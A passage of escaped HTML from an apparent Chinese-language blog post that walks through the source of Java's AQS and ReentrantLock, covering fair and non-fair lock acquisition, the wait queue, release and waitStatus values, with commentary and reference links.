class=\"line\">        <span class=\"comment\">//拿到锁变量</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> c = getState();</span><br><span class=\"line\">        <span class=\"comment\">//c=0表示当前锁是空闲状态，可能刚被释放</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//hasQueuedPredecessors():返回没有等待的线程以及当前线程没有在工作</span></span><br><span class=\"line\">            <span class=\"comment\">//直接抢占，与lock方法类似，也是与非公平锁的唯一区别，非公平锁会先直接CAS抢占</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class=\"line\">                compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//没人等并且cas设值成功，锁归我了</span></span><br><span class=\"line\">                setExclusiveOwnerThread(current);</span><br><span class=\"line\">                <span class=\"comment\">//返回AQS的acquire方法，告诉他我拿到锁了，让别人去排队</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> nextc = c + acquires;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Error(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">            setState(nextc);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NonfairSync</span> <span class=\"keyword\">extends</span> <span class=\"title\">Sync</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> serialVersionUID = <span class=\"number\">7316153563782823691L</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//直接抢，抢到了就设置线程为当前线程，否则加入等待队列acquire(1);</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">            setExclusiveOwnerThread(Thread.currentThread());</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//AQS的acquire方法会调用tryAcquire，判断是否获取锁成功。tryAcquire是子类实现的模板</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryAcquire</span><span class=\"params\">(<span class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">         <span class=\"keyword\">final</span> Thread current = Thread.currentThread();</span><br><span class=\"line\">        \t<span class=\"comment\">//拿到锁变量</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> c = getState();</span><br><span class=\"line\">        \t<span class=\"comment\">//c=0表示当前锁是空闲状态，可能刚被释放</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//直接抢占，与lock方法类似，也是与公平锁的唯一区别，公平锁会先判断等待队列是否为空</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">                    setExclusiveOwnerThread(current);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        \t<span class=\"comment\">//如果当前线程就是正在工作的线程</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> nextc = c + acquires;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>) <span class=\"comment\">// overflow</span></span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Error(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">                setState(nextc);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>1、为什么需要AQS? </p>\n<p>锁类型分为： </p>\n<p>​    1、互斥锁（独占锁）：同一时间只有一个线程能获取锁(ReentrantLock)</p>\n<p>​    2、共享锁：允许多个线程同时拿到锁（例如：读写锁ReadWriteLock读写锁，写锁和写锁、写锁和读锁互斥，读锁和 读锁可以共享) 这两个类都设计到线程的互斥问题，这就意味着总会有线程拿不到锁，那么这时为了避免的资源浪费（一直执行无关的 操作CAS),所以我们需要将线程阻塞，既然涉及到了线程阻塞操作，那么必然会有唤醒操作。所以我们需要： </p>\n<p>​    1、存放等待线程的数据结构：队列 </p>\n<p>​    2、操作线程阻塞和唤醒的方法：LockSupport类 </p>\n<p>​    3、表示当前锁的状态：state变量：0无锁、1有锁 </p>\n<p>所以AQS的出现就是对于互斥锁、共享锁的抽象：队列+state </p>\n<p>2、什么公平锁？什么是非公平锁 </p>\n<p>​    1、公平锁：FIFO先进先出)，根据AQS的排队的队列来看，是否有线程在排队，如果没有，那么抢锁，如果有那么排队先来后到 </p>\n<p>​    2、非公平锁：直接抢，管他有没有线程排队。抢不到就乖乖排队先来后到</p>\n<p>3、什么是抢锁？ AQS的实现有一个state变量，将其争夺修改为1，那么这种争夺的行为叫做抢锁</p>\n<p>4、怎么抢锁？抢锁的实现方式是什么？ CAS: Compare And Swap</p>\n</blockquote>\n<h2 id=\"源码追踪：\"><a href=\"#源码追踪：\" class=\"headerlink\" title=\"源码追踪：\"></a>源码追踪：</h2><h4 id=\"以非公平锁为例子\"><a href=\"#以非公平锁为例子\" class=\"headerlink\" title=\"以非公平锁为例子\"></a>以非公平锁为例子</h4><p>线程阻塞</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//ReentrantLock调用局部变量sync的lock方法，Sync有NonFairSync与FairSync两个实现类，默认是非公平</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    sync.lock();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//二话不说直接CAS抢锁，成功就设置工作线程为自己</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">        setExclusiveOwnerThread(Thread.currentThread());</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"comment\">//失败了加入等待队列</span></span><br><span class=\"line\">        acquire(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">acquire</span><span class=\"params\">(<span class=\"keyword\">int</span> arg)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//再次尝试获取，失败了就才加入队列，同时阻塞线程</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class=\"line\">        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class=\"line\">        selfInterrupt();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//模板方法</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryAcquire</span><span class=\"params\">(<span class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nonfairTryAcquire(acquires);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">nonfairTryAcquire</span><span class=\"params\">(<span class=\"keyword\">int</span> acquires)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Thread current = Thread.currentThread();</span><br><span class=\"line\">    <span class=\"comment\">//获取锁的状态</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = getState();</span><br><span class=\"line\">    <span class=\"comment\">//有人释放锁了！尝试获取</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetState(<span class=\"number\">0</span>, acquires)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//成功了，不用加入等待队列了</span></span><br><span class=\"line\">            setExclusiveOwnerThread(current);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//可重入</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> nextc = c + acquires;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nextc &lt; <span class=\"number\">0</span>) <span class=\"comment\">// overflow</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Error(<span class=\"string\">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class=\"line\">        setState(nextc);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//获取失败，需要加入队列咯</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//将线程实例化为Node并加入队列，本质为双向链表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> Node <span class=\"title\">addWaiter</span><span class=\"params\">(Node mode)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//实例化</span></span><br><span class=\"line\">    Node node = <span class=\"keyword\">new</span> Node(Thread.currentThread(), mode);</span><br><span class=\"line\">    Node pred = tail;</span><br><span class=\"line\">    <span class=\"comment\">//队列已经初始化完（自己不是第一个来的）这个if是一个优化，与下面的enq方法部分类似，因为大多数情况已经初始化完了队列</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pred != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//设置新增节点的前驱为之前的尾部节点</span></span><br><span class=\"line\">        node.prev = pred;</span><br><span class=\"line\">        <span class=\"comment\">//CAS设置成功（如果tail节点还是等于pred的话，也就是说没有其他线程修改了那么更新尾部节点为node）</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (compareAndSetTail(pred, node)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//将尾部节点的后驱节点设置为新增节点</span></span><br><span class=\"line\">            pred.next = node;</span><br><span class=\"line\">            <span class=\"comment\">//添加完了，可以退出方法了  </span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> node;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    enq(node);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> node;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不断自旋直至将新增节点加到了队列</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> Node <span class=\"title\">enq</span><span class=\"params\">(<span class=\"keyword\">final</span> Node node)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//死循环必定有分支</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取最新的tail</span></span><br><span class=\"line\">        Node t = tail;</span><br><span class=\"line\">        <span class=\"comment\">//为空意味着没有初始化</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">            <span class=\"comment\">//直接初始化并把节点放到头部</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (compareAndSetHead(<span class=\"keyword\">new</span> Node()))</span><br><span class=\"line\">                tail = head;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//该分支与上一个方法的if完全相同，只是为了提高效率</span></span><br><span class=\"line\">            node.prev = t;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (compareAndSetTail(t, node)) &#123;</span><br><span class=\"line\">                t.next = node;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//该方法不断自旋直至获得锁或线程阻塞</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">acquireQueued</span><span class=\"params\">(<span class=\"keyword\">final</span> Node node, <span class=\"keyword\">int</span> arg)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> failed = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> interrupted = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"comment\">//自旋直至获得锁或者阻塞</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//获得当前节点的前驱节点</span></span><br><span class=\"line\">            <span class=\"keyword\">final</span> Node p = node.predecessor();</span><br><span class=\"line\">            <span class=\"comment\">//如果是头结点就开始尝试获得锁</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p == head &amp;&amp; tryAcquire(arg)) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//获取成功了将当前节点设置为头节点                 </span></span><br><span class=\"line\">                setHead(node);</span><br><span class=\"line\">                <span class=\"comment\">//提高GC效率</span></span><br><span class=\"line\">                p.next = <span class=\"keyword\">null</span>; </span><br><span class=\"line\">                failed = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> interrupted;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//shouldParkAfterFailedAcquire方法：找到阻塞队列中没有线程中断的线程并把WaitStatus设置成Node.SIGNAL，值为-1。</span></span><br><span class=\"line\">            <span class=\"comment\">//parkAndCheckInterrupt方法：阻塞线程，唤醒后返回线程中断标志。若线程被中断了则会调用selfInterrupt()方法。</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;</span><br><span class=\"line\">                parkAndCheckInterrupt())</span><br><span class=\"line\">                interrupted = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (failed)</span><br><span class=\"line\">            cancelAcquire(node);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>线程唤醒</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">unlock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    sync.release(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">release</span><span class=\"params\">(<span class=\"keyword\">int</span> arg)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取锁的状态</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tryRelease(arg)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取头节点</span></span><br><span class=\"line\">        Node h = head;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (h != <span class=\"keyword\">null</span> &amp;&amp; h.waitStatus != <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//唤醒head的线程</span></span><br><span class=\"line\">            unparkSuccessor(h);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryRelease</span><span class=\"params\">(<span class=\"keyword\">int</span> releases)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c = getState() - releases;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalMonitorStateException();</span><br><span class=\"line\">    <span class=\"keyword\">boolean</span> free = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"comment\">//当前锁是空闲的</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        free = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        <span class=\"comment\">//设置当前工作线程为空</span></span><br><span class=\"line\">        setExclusiveOwnerThread(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    setState(c);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> free;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//唤醒线程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">unparkSuccessor</span><span class=\"params\">(Node node)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ws = node.waitStatus;</span><br><span class=\"line\">    <span class=\"comment\">//ws小于0表示线程正在等待</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ws &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        compareAndSetWaitStatus(node, ws, <span class=\"number\">0</span>);</span><br><span class=\"line\">    Node s = node.next;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s == <span class=\"keyword\">null</span> || s.waitStatus &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        s = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"comment\">//从尾部开始遍历直到头节点，从尾节点遍历的原因是从头节点遍历会出现断链的情况。由于多线程的修改</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Node t = tail; t != <span class=\"keyword\">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (t.waitStatus &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                s = t;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (s != <span class=\"keyword\">null</span>)</span><br><span class=\"line\">        <span class=\"comment\">//通过LockSupport工具类唤醒线程，底层通过Unsafe调用native方法实现唤醒</span></span><br><span class=\"line\">        LockSupport.unpark(s.thread);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<p>对于AQS的state的一些理解</p>\n<p>先来看一段reentrantlock中的公平锁代码 int c = getState();进来先获取state的状态信息，若c==0则表示当前锁没有被线程持有，进入下一步，因为是公平锁，所以线程在尝试获取锁时需要判断当前等待队列里面是否已经有线程在等待了，若是有的话，当前线程就不会去尝试获取锁，<br>若是当前锁已经被线程持有了，即c ！= 0，那么会比较当前线程和持有锁线程的关系，即判断当前是否是持有锁的线程又一次来尝试获取锁，这也是reentrantlock是可重入锁的原因，在current == getExclusiveOwnerThread()时，会将state+1，并且返回true，而对应的在释放锁的时候，肯定也是需要释放多次的<br>这是互斥锁的state变化，也就是为0代表没有被线程持有，不为0的话就代表是一个线程获取了几次这个锁，也就是重入了几次<br>而aqs还有一个锁的实现方式，就是共享锁，juc包下面的读锁就是共享锁，共享锁的state则是一个类似资源数的量，假如state初始为3，那么就可以有三个线程来同时获取锁</p>\n<p>对于Node的state的一些理解</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//表示线程获取锁的请求已取消</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> CANCELLED = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">//表示线程已准备好正等待唤醒</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> SIGNAL = -<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">//表示线程在队列中等待获取同步锁</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> CONDITION = -<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"comment\">//表示共享模式下无条件传播，共享锁</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> PROPAGATE = -<span class=\"number\">3</span>;</span><br></pre></td></tr></table></figure>\n\n<p>注意，<strong>负值表示结点处于有效等待状态，而正值表示结点已被取消。所以源码中很多地方用&gt;0、&lt;0来判断结点的状态是否正常</strong>。</p>\n<blockquote>\n<p>​    对于CAS的一些理解</p>\n<p>一般都通过自旋实现，对于双向链表，一般会维护一个tail变量提高尾插的效率。对于高并发插入操作，此时竞争点在tail上。先将需要新增的节点的前驱节点指向tail节点，然后自旋CAS判断尾部是否为之前获取到的，如果是就修改尾部为新增节点，否则继续循环获取CAS锁</p>\n</blockquote>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://blog.csdn.net/lppzyt/article/details/106743809\">https://blog.csdn.net/lppzyt/article/details/106743809</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/114257735\">https://zhuanlan.zhihu.com/p/114257735</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41977838/article/details/106578717\">https://blog.csdn.net/qq_41977838/article/details/106578717</a></p>\n","categories":["java"]}]